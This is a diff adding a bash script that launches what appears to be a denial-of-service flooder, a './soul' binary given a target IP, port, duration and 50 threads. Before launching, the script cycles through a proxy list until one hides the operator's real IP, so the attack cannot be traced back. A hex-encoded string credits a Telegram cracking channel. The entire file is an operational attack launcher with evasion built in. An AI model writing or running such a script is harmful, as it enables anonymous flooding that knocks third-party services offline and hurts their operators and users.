@@ -1,0 +1,66 @@
+#!/bin/bash
+
+# Function to decode hex to text
+decode_hex() {
+    echo "$1" | xxd -r -p
+}
+
+# Hidden message (hex encoded)
+HIDDEN_MESSAGE_HEX="544849532046494c45204953204d4144452042592040534f554c435241434b53204348414e4e454c2054454c454752414d"
+
+# Check if the correct number of arguments are provided
+if [ "$#" -ne 3 ]; then
+    echo "Usage: $0 <ip> <port> <duration>"
+    exit 1
+fi
+
+# Arguments
+TARGET_IP="$1"
+TARGET_PORT="$2"
+TARGET_DURATION="$3"
+THREADS="50"  # Fixed number of threads
+
+# Path to your proxy list file
+PROXY_LIST="proxies.txt"
+
+# Function to test if the proxy is working and return the new IP
+test_proxy() {
+    local proxy=$1
+    NEW_IP=$(curl -s -x "$proxy" ifconfig.me)
+    echo "$NEW_IP"
+}
+
+# Display the real IP
+echo "Getting real IP..."
+REAL_IP=$(curl -s ifconfig.me)
+echo "Real IP: $REAL_IP"
+
+# Infinite loop to test proxies until successful
+while true; do
+    while IFS= read -r proxy; do
+        if [[ -n "$proxy" ]]; then
+            echo "Trying proxy: $proxy"
+            NEW_IP=$(test_proxy "$proxy")
+
+            if [ "$REAL_IP" != "$NEW_IP" ]; then
+                echo "IP successfully changed to $NEW_IP using proxy $proxy"
+
+                # Run the ./soul command with the parameters and fixed number of threads
+                echo "Running the ./soul command..."
+                ./soul "$TARGET_IP" "$TARGET_PORT" "$TARGET_DURATION" "$THREADS"
+                # Decode and display the hidden message before exiting
+                echo "Decoded hidden message:"
+                decode_hex "$HIDDEN_MESSAGE_HEX"
+                exit 0
+            else
+                echo "IP did not change with proxy $proxy."
+            fi
+        fi
+    done < "$PROXY_LIST"
+    
+    echo "All proxies tested. Retrying..."
+done
+
+# Decode and display the hidden message after script completion
+echo "Decoded hidden message:"
+decode_hex "$HIDDEN_MESSAGE_HEX"
